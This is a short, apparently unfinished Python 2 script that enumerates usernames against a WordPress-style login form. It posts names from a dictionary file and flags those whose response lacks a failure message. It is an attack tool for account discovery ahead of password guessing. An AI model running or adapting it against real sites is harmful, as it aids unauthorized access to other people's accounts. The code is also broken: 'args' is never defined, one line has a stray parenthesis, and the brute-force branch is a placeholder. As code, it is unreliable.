import requests
import re
import sys
import argparse
#test

def test_login(username,url,falseValue):
	payload ={"log":username,"pwd":"fu"}
	r = requests.post(url,data=payload)
	m= re.search(falseValue,r.text)
	if m is None:
		if(r.status_code==404):
			print "Error page not found, will exit, try to put a valid url or false value"
			sys.exit(0)
		return True
	return False
if args.url==False or args.falseValue==False:
	print "RTFM"
	sys.exit(0)


file = open("dict.txt"))
line = file.readline()
while line:
	if(args.verbose):
		print "Trying with : %s"%(line)
	if(test_login(line,args.url,args.falseValue)):
		print "Found a valid login with : %s"%(line)
		sys.exit(1)
	else:
		line = file.readline()
file.close()

if(args.bruteforce):
	print "foo"

